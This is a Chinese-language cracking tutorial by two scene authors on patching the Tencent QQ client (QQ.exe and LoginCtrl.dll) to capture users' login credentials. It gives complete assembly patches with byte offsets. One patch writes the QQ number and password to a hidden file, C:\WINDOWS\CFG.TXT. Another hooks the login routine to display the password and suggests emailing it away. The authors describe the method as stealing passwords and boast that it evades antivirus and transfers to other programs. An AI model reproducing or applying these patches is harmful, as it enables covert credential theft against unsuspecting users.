0058CDF1  FF35 80CD5800  push dword ptr ds:\[58CD80\]  ;前面保存的文件句柄  
0058CDF7  FF15 A4915300  Call dword ptr \[005391A4\]   ; KERNEL32.WriteFile  
0058CDFD  33C0           xor eax,eax  ；eax 清零  
0058CDFF  40             inc eax      ；eax 赋值为 1  
0058CE00  A3 5ACD5800    mov dword ptr ds:\[58CD5A\],eax ；已经记录的标志：\[58CD5A\]=1  
0058CE05  EB 07          jmp 0058CE0E     ；记录成功跳走吧！0058CE0E  
0058CE07  33C0           xor eax,eax  ；不用记录或已经记录了就跳到这里，eax 清零  
0058CE09  A3 5ACD5800    mov dword ptr ds:\[58CD5A\],eax ；清零记录的标志  
0058CE0E  61             popad   ；所有的寄存器依次出栈，恢复原样，重要！！！  
0058CE0F  8D86 24040000  lea eax,dword ptr ds:\[esi+424\] ；补上  
0058CE15  E9 A16AE8FF    jmp 004138BB ；返回  
   
  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
二.显示 QQ 登陆号码   
ecx\=QQ 号码,eax\=号码长度  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
源文件为：  
\* Reference To: MFC42.Ordinal:0F22, Ord:0F22h        
:00414B2F E8FAAA0E00   Call 004FF62E  ;ecx\=QQ 号码,eax\=号码长度  
:00414B34 33DB         xor ebx, ebx   ;我们就改这里了！！！  
:00414B36 395E68       cmp dword ptr \[esi+68\], ebx  
:00414B39 7403         je 00414B3E  
:00414B3B 895E6C       mov dword ptr \[esi+6C\], ebx  
改为：  
:00414B2F E8FAAA0E00   Call 004FF62E  ;ecx\=QQ 号码,eax\=号码长度  
:00414B34 E953831700   jmp 58ce8c  
:00414B39 7403         je 00414B3E  
:00414B3B 895E6C       mov dword ptr \[esi+6C\], ebx  
\*\*\*   中间少了下面，我们在后面补上：  
\*\*\* :00414B3433DB      xor ebx, ebx   
    :00414B36 395E68   cmp dword ptr \[esi+68\], ebx  
   
:00414B34 跳到我们的代码，我们在.rdata 段 0018Ce8C 开始我们的工作：  
   
这次我们不给 QQ 号码前后加分隔符了，而且也不用判断是否写入文件，原因后表。  
   
0058CE8C  60             pushad   ；所有的寄存器依次入栈  
0058CE8D  890D 84CD5800  mov dword ptr ds:\[58CD84\],ecx ；ecx 这时为 QQ 号码，存下  
0058CE93  90             nop  
......  
保留空间，备用  
......  
0058CEAD  90             nop  
0058CEAE  A3 88CD5800    mov dword ptr ds:\[58CD88\],eax ；eax 这时为 QQ 号码长度，存下  
0058CEB3  6A 00          push 0 ；以下同前面保存密码  
0058CEB5  6A 02          push 2  
0058CEB7  6A 04          push 4  
0058CEB9  6A 00          push 0  
0058CEBB  6A 03          push 3  
0058CEBD  68 000000C0    push C0000000  
0058CEC2  68 60CD5800    push 0058CD60      ; ASCII "C:WINDOWSCFG.TXT"  
0058CEC7  FF15 9C915300  Call dword ptr \[0053919C\] ; KERNEL32.CreateFileA  
0058CECD  A3 80CD5800    mov dword ptr ds:\[58CD80\],eax  
0058CED2  6A 02          push 2  
0058CED4  6A 00          push 0  
0058CED6  6A 00          push 0  
0058CED8  50             push eax  
0058CED9  FF15 A0915300  Call dword ptr \[005391A0\]  ; KERNEL32.SetFilePointer  
0058CEDF  6A 00          push 0  
0058CEE1  68 74CD5800    push 0058CD74  
0058CEE6  FF35 88CD5800  push dword ptr ds:\[58CD88\] ；号码长度  
0058CEEC  FF35 84CD5800  push dword ptr ds:\[58CD84\] ；号码地址  
0058CEF2  FF35 80CD5800  push dword ptr ds:\[58CD80\] ；前面保存的文件句柄  
0058CEF8  FF15 A4915300  Call dword ptr \[005391A4\]  ; KERNEL32.WriteFile  
0058CEFE  90             nop  
......  
保留空间，备用  
......  
0058CF0E  90             nop  
0058CF0F  61             popad  ；所有的寄存器依次出栈，恢复原样，重要！！！  
0058CF10  33DB           xor ebx,ebx  ；补上  
0058CF12  395E 68        cmp dword ptr ds:\[esi+68\],ebx  ；补上  
0058CF15  E9 1F7CE8FF    jmp 00414B39  ；返回  
   
\*\*\*\*\*\*\*\*\*\*\*  
完工！！  
\*\*\*\*\*\*\*\*\*\*\*  
   
3.问题讨论：  
    再来说说我们为什么不给 QQ 号码前后加分隔符，而且也不用判断是否写入文件。  
    原先按 nbw 提供的思路，我们是给 QQ 号码和密码的后面分别加分隔符，但是实际执行时，却出现了问题。原来 QQ 号码存储的 ECX 内存地址的后面是有用的！我开始也不知道，当时按 nbw 的方法改造之后，发现 QQ 每次登陆都成了初次登陆还常 QQ 死机（当时 nbw 的方法是改造 QQHelperInDll.dll 文件，我也是跟着改的，后来发现不行，才想到直接改 QQ 主文件，没想到改了还不行。nbw 后来说他还没有使用过，所以他不知道这个问题，哈哈），检查了半天堆栈平衡也没发现原因，直到我试着给 ecx 的前面添加分隔符时，才发现只有前面可以加，后面不行！然后猜测 ECX 地址的后面的那个字节是有用的！估计是存储 QQ 是否初次登陆的标志的！我干脆就给 QQ 密码的 ECX 前后都加分隔符，不管 QQ 号码的 ECX 了，这样同样达到分隔的目的！  
      
4.btw 问题  
     在完成以上文字后，我突然想起要在不同操作系统下测试一下（以上在 win2000 下完成），winxp 下没有问题，但是在 win98 下报错，报错位置在 0x0018CE07，经测试说明.rdata 区段 0x0018CE07 此后的剩余空间不能在 win98 里使用！看来 win98 与 win2k（winxp）是有很大区别啊，至于为什么我们不去追究了！不过还好我们还有其他可用的节区（section）：  
     2004 年 5 月 25 日，发布的木子 1.4 版本 QQ.exe  
    名称     RVA     OA        尺寸 D   可写否  
   .text  00138e0e  00138e0e    498      否  
  .rdata  0018cd26  0018cd26    730      否  
   .data  001ac2c4  001ac2c4  -12996      可  
   .rsrc  001b2dc8  001aedc8    568      否  
   有效剩余空间(字节 D)为: 1796  
   开始我试用了.rsrc（在 win98 下调试了）不行。但.text 是可用的，改造方法还是和前面一样，另外我还把补丁在.rdata 里的数据前移了 30H，这样就避开 0x0018CE07 了，当时前面正好我留了一些空间，看来以后要先试试空间能否用再补丁，不再赘述。  
   完成后再回到 win2000 下，测试能用！看来以后最好要先在 win98 下调试能用！我觉得最好写在.rdata 里（看雪的书里有介绍)，自从写在.text 里以后有些问题，比如运行完 QQ 退出，不能删除 QQ.exe！当然这是木子版 QQ，他们已经用了很多宝贵地方，留给我的很少了,当然我们完全可以自己增加 section，可这样就改变 QQ.exe 了。  
   以上代码我就懒得再改了，累死我了！这些 win2000 和 winxp 还是可以用的。  
   
总结：  
    这是我第一次自己动手 diy，在此之前我对 pediy 是一窍不通！感谢 nbw 提供了他的笔记，主要是他无私提供了方法！虽然我看懂他的程序，但是要是让我从头写，那是根本不可能的，我这次可学到 pediy 的基本入门了，以前根本摸不着门！而且我觉得汇编也上了一个层次^\_^（不是法 X 功啊！），我觉得我以后可以试试用汇编作注册机了，这样甚至不用搞懂算法。  
    最后说一下 pll621 的 C32asm，绝对是好东东，虽然我习惯用 W32dasm，但 C32asm 的汇编代码查询器，绝对是好，我觉得可以抛弃 hiew 了，用 C32asm 的汇编代码查询器写汇编，然后再用 16 进制编辑器如 UltraEdit10 把代码写到文件里，再结合 ollydbg 1.10 调试一下，美啊！我以上添加的代码就是这样的，几乎一次成功（除了改几个跳转的代码）！感谢 pll621 提供的好东东。  
    我觉得我写的较 nbw 详细一些，更适合我们这些初学者阅读理解，好东西要大家分享！  
最后，感谢 nbw 的无私指导。  
  
  
QQ2004 测试版密码获取演示  
          
作者：nbw      [www.vxer.com](http://www.vxer.com)  
  
       以前我做过盗取 QQ2003 密码的补丁。利用这种补丁修改 QQ 后，盗取密码完全由 QQ 自身完成。基本不占用资源，不会被查杀。从理论上来讲大部分需要填写密码的游戏或者程序都可以采用这种方法盗取号码。现在 QQ2004 测试版出来了，其安全性比以往有了很大加强。其号码的获取和 QQ2003 基本一样，但是密码的处理更为复杂。下面我就说说如何获取其密码。  
  
这里只是一个演示，当用户输入密码登陆后，会弹出对话框把用户输入的密码显示出来。从理论上来说，做到这一步，便意味着可以随便处理这个密码（比如发送到某个邮箱，嘿嘿），我现在很忙，写东西也没条理这篇文章更像一篇笔记，如果你觉得占用了你的时间，我实在很不好意思。  
  
获得保存号码的地方:  
  
   
  
   如果输入的号码位数小于 5,则提示错误.可以下命令 bpx messageboxa,再 Pmodule 返回程序  
  
领空,向上查看,很容易可以得到获取号码的地点如下:  
  
0167:01f63d5d       call  ....(当然这个地址是变化的.)  
  
   
  
返回的 eax 为号码地址.且领空为 Loginctrl  
  
下面有个函数:QQHELPERDLL!?CheckQQUinValid@@YAHVCString@@@Z(看看命名,范了兵家大忌!),用来判定号码的合法性,进去以后可以看到:  
  
   
  
:1000D8D6 8B4508                  mov eax, dword ptr \[ebp+08\]   ;eax\-->号码  
  
:1000D8D9 8B40F8                  mov eax, dword ptr \[eax\-08\]    ;eax\-->密码  
  
:1000D8DC 83F805                  cmp eax, 00000005          ;比较号码长度是否大于 5  
  
:1000D8DF 7D05                    jge 1000D8E6  
  
   
  
领空为: QQHELPERDLL,也就是代码在这个文件中.去这个文件查找上面的代码,便可以找到.由于在 TRW 中看到的地址并不是个文件中的 RVA(因为是动态调用),所以查找这个地方应该搜索特征码,就是利用 Search 命令搜索上面这几行代码或者他们的 Opcode.最好用 WinHex 打开 QQ 进程中的 Loginctrl.dll 领空来搜索.  
  
   
  
保存密码处:  
  
   
  
    找到了号码存放位置以后,填写号码和密码点下一步(最好填 5 位以下的密码,这样就不用进入下一个界面).在上面的 mov eax, dword ptr \[ebp+08\]处拦截下来.下命令 d eax,看到自己的号码.向下(或者向上)不远便是自己输入的密码.这个存放密码的位置是变化的.比如说这次是在 0030:008FB720 处.下命令 bpm 0030:008FB720 w .再次输入登录,被拦截.按 F10,慢慢向下走,过了好几个 call,直到 LOGINCTRL 的领空.看看上面的函数,为:  
  
:10004C42 FF7510                  push \[ebp+10\]  
  
:10004C45 FF750C                  push \[ebp+0C\]  
  
:10004C48 FF7508                  push \[ebp+08\]  
  
   
  
\* Reference To: MFC42.Ordinal:062A, Ord:062Ah  
  
                                  |  
  
:10004C4B E8E8110000              Call 10005E38  
  
:10004C50 8B4DF0                  mov ecx, dword ptr \[ebp\-10\]  
  
   
  
在 Call 10005E38 上下断点,会发现即使不操作 QQ 也会频繁中断在这个地点.对我们来说,这是多么不幸啊! 所以,再次打开断点 bpm 0030:008FB720 w ,重新登录,被中断,像刚才一样 F10,不断向下走,观察程序领空,当然会再次看到 Call 10005E38,不过不要管他,继续向下走.不停看啊看啊,每次过了一个 ret,如果发现领空不是系统领空(就是不是什么 User 或者 kernel32)就向上看看上面的 call,最后到了:0167:01D426DC  E855240000   call  MFC42!ord\_00000942  ,这里的领空仍然是 LOGINCTRL,利用特征码,在 W32Dasm 中查找"E855240000",具体就是:  
  
   
  
:100026CE 8D8648050000            lea eax, dword ptr \[esi+00000548\]  
  
\* Possible Reference to Dialog: DialogID\_01C2, CONTROL\_ID:00B4, ""  
  
                                  |  
  
:100026D4 BBB4000000              mov ebx, 000000B4  
  
:100026D9 50                      push eax             ;存放密码的地址  
  
:100026DA 53                      push ebx  
  
:100026DB 57                      push edi  
  
   
  
\* Reference To: MFC42.Ordinal:0942, Ord:0942h  
  
                                  |  
  
:100026DC E855240000              Call 10004B36           ;\*\*\*\*\*\*\*\*\*\*关键函数  
  
                                                   
  
:100026E1 8D864C050000            lea eax, dword ptr \[esi+0000054C\]  
  
   
  
注意上面的 CONTROL\_ID:00B4,这里或许就是密码框的 ID.  
  
    对于每一个重要的函数,分析其参数无疑是非常明智的.看看上面这个函数,有三个参数 eax,ebx,edi,多跟踪几次便会发现,eax 中为存放密码的地址,函数的返回值是密码长度.但是函数好像没有把密码长度存放起来(lea eax, dword ptr \[esi+0000054C\]),或许是密码验证在函数中全部完成,跳出函数后不再需要?(猜想)  
  
    eax 在函数入口时作为密码存放地址,函数结束时为密码长度.而函数领空是系统领空,无法对其进行修改.所以,可以在入栈的时候跳转到我们的代码,保存 eax 的值,在函数结束的时候再次跳转,再次保存 eax 以获得密码长度.这样 2 次 SMC,肯定会很麻烦.有兴趣可以试验一下,练手嘛.  
  
    幸运的是入栈操作的上方有:100026CE  lea eax, dword ptr \[esi+00000548\] ,观察一下\[esi+00000548\]的值,发现在函数执行期间未曾发生变化.所以可以从\[esi+00000548\]获得密码存放地址.  
  
    不幸的是,这个函数虽然未曾被频繁调用,但是在登录的时候会被调用 n 次，这样假如你要保存密码，就会 n 次保存。虽然不碍事，就是麻烦些,并且这些数据中只有一个是真正的密码.但是我还有余力对付这些 LG,so,整理一下思路,后面再说如何 fuck it!  
  
    故此,我们得到以下结论:  
  
    当:100026DC E855240000   Call 10004B36  执行完毕后(也就是在:100026E1 处),\[esi+00000548\]中存放的是密码的地址,eax 中是密码长度.  
  
   
  
获取密码演示:（每当用户登陆，便弹出对话框显示用户输入的密码）  
  
用我的剩余空间分析器,分析一下 LOGINCTRL 文件的剩余空间:  
  
   
  
名称     RVA     OA        尺寸 D   可写否  
  
   .text  0000681a  0000681a   2022      否  
  
  .rdata  00009238  00009238   3528      否  
  
   .data  0000b414  0000b414  -1044      可  
  
   .rsrc  00017568  00016568   2712      否  
  
  .reloc  00018b04  00017b04   1276      否  
  
   
  
.text 段不错.有 2022 字节空间.试验一下也可以正常载入,用 Pedit 把这个区段的属性改为可写可读(不然的话无法在这个区段设置可写变量)  
  
   
  
打开 LOGINCTRL 文件,修改:  
  
:100026DC E855240000              Call 10004B36  
  
:100026E1 8D864C050000            lea eax, dword ptr \[esi+0000054C\]  
  
:100026E7 50                       push eax  
  
   
  
:100026E8 6844010000               push 00000144  
  
   
  
为:  
  
:100026DC E855240000              Call 10004B36  
  
:100026E1                                         jmp  6830         ;跳转到剩余空间.  
  
:100026E7                         push eax  
  
少了:100026E1 8D864C050000            lea eax, dword ptr \[esi+0000054C\] .记下来,以后补上.  
  
   
  
    由于这个关键函数在很多时候都被调用,因此需要判断是不是应该获得密码的时候,我这里通过判断 eax 和\[4D6FAC\]来判断究竟是不是应该获取密码,具体算法如下:  
  
   
  
       if  eax\==00  then  
  
              ;程序正在启动,跳出  
  
              ;这种判断程序启动的方法,存在一个问题,就是如果用户的密码本身为空,我们就采集不到了,因为那样的话也会导致 eax=0  
  
       else  
  
           if     \[4D6FAC\]=00 then  
  
              ;获取密码  
  
                     \[4D6FAC\]=01  
  
              else    
  
                   \[4D6FAC\]=00  
  
           endif  
  
       endif  
  
   
  
    这里的\[4D6FAC\]是标志位.选这个地址的原因稍候再谈.  
  
   
  
动态内存地址的查找:  
  
    由于 QQ2004 的特殊处理,导致一些代码执行的时候所在的内存地址是变化的.就比如上面的关键函数,它的地址就是变化的.这样无疑加强了安全性,也很明显给我们提出了难度,因为好不容易找到的关键地址下次就发生了变化,让人很恼火.  
  
    好在地址的变化并不频繁.几天(或许一次开机)才变化一次.这样就可以很容易找到我们需要的代码的地址.比如要查找:100026DC E855240000    Call 10004B36   在内存中的地址.可以用 WinHex 打开 QQ 进程中的 Loginctrl.dll 域.搜索这个函数的代码,也就是"E855240000",注意用 Hex 模式搜索,并且不要用小尾方式,因为这是 code 段,不是 data 段.  
  
    找到后,比如说是 01D36835 处的数据为 E855240000 ,那么下命令 bpx  0167:01D36835 就可以拦截这个函数了.  
  
   
  
标志位地址确定（上面的\[4D6FAC\]）:  
  
   
  
    上面说过,LOGINCTRL 被加载了以后,其内存地址(VA)并不是固定的, 按道理来说对于这种情况可以采用重定位技术,动态获取当前 eip,不过这里的 LoginCtrl 毕竟是 dll,我估计不行,所以也没试验.有兴趣的朋友可以看看.  
  
所以标志位就不要在这个文件中寻找.这样可以去 QQ 主文件查找.需要找一个有可写属性的多余空间.4 个字节大小就够(其实一个就够).  
  
    查看一下 QQ.exe 的节区属性,只有.data 段可写.所以在这一段最后找一块地方.这个地方需要可以正常加载,并且不会被使用. .rsrc(D7000 处)区段上面有一段空白处.在这里填上全 1,然后打开 QQ 查看一下,发现有的地方不是 1,说明被使用了.有的地方是 1,说明没有被使用(至少登陆的时候).其中 Dword ptr \[4D6FAC\]就不错.不要忘了把这地方填入的 1 再改为 0.  
  
      
  
变量组织:  
  
   
  
对话框标题: \[1D368B0\]=C3DCC2EBCAC73A(密码是:)  
  
标记:      \[4D6FAC\] =00       ;获取密码  
  
       \[4D6FAC\] =01       ;不获取密码  
  
   
  
新添加代码:  
  
6830(OA)  
  
6830:      nop  
  
       nop  
  
       nop  
  
       pushad  
  
       cmp eax,000  
  
       je     @1  
  
       mov ecx,\[4D6FAC\]  
  
       cmp ecx,01  
  
       je     @1  
  
   
  
       push       00  
  
       push       1D368B0  
  
       mov ebx,\[esi+548\]         ;ebx\-->密码地址  
  
       push       ebx  
  
       push       00  
  
       call  dowrd     \[004A49E0\]    ;messageboxa  
  
                                   ;请注意这里采用的是 QQ.exe 中的引入函数,  
  
                                   ;而不是 LOGINCTRL 中的引入函数.  
  
       xor  eax,eax  
  
       inc   eax  
  
       mov \[4D6FAC\],eax  
  
       jmp  @2  
  
@1:  
  
       xor  eax,eax  
  
       mov \[4D6FAC\],eax  
  
@2:  
  
       popad  
  
       lea eax, dword ptr \[esi+0000054C\]  
  
       jmp 26e7  
  
具体代码见附录  
  
   
  
   这样当输入密码和号码,点击登陆,便可以弹出对话框显示密码,由于该对话框不在 QQ.exe 领空,所以这里对话框会显示在主界面下面,你可以把主界面挪动一下就可以看到该对话框.  
  
   
  
附录:  
  
新添加的代码:  
  
:10006830 90                      nop  
  
:10006831 60                      pushad  
  
:10006832 83F800                  cmp eax, 00000000  
  
:10006835 7430                    je 10006867  
  
:10006837 8B0DAC6F4D00            mov ecx, dword ptr \[004D6FAC\]  
  
:1000683D 83F901                  cmp ecx, 00000001  
  
:10006840 7425                    je 10006867  
  
:10006842 6A00                    push 00000000  
  
:10006844 68B069D301              push 01D369B0  
  
:10006849 8B9E48050000            mov ebx, dword ptr \[esi+00000548\]  
  
:1000684F 53                      push ebx  
  
:10006850 6A00                    push 00000000  
  
:10006852 90                      nop  
  
:10006853 90                      nop  
  
:10006854 FF15E0494A00            call dword ptr \[004A49E0\]  
  
:1000685A 33C0                    xor eax, eax  
  
:1000685C 40                      inc eax  
  
:1000685D A3AC6F4D00              mov dword ptr \[004D6FAC\], eax  
  
:10006862 E907000000              jmp 1000686E  
  
   
  
\* Referenced by a (U)nconditional or (C)onditional Jump at Addresses:  
  
|:10006835(C), :10006840(C)  
  
|  
  
:10006867 33C0                    xor eax, eax  
  
:10006869 A3AC6F4D00              mov dword ptr \[004D6FAC\], eax  
  
   
  
\* Referenced by a (U)nconditional or (C)onditional Jump at Address:  
  
|:10006862(U)  
  
|  
  
:1000686E 61                      popad  
  
:1000686F 8D864C050000            lea eax, dword ptr \[esi+0000054C\]  
  
:10006875 E96DBEFFFF              jmp 100026E7  
  
 如有转载，请注明作者  
laoqian\[FCG\]     nbw\[NE365\]\[BCG\]\[FCG\]\[DFCG\]  
[`www.fcgchina.com/ctb`](http://www.fcgchina.com/ctb)  
[www.vxer.com](http://www.vxer.com)

 4dd466d0e1e0cc123afbe504da2462ca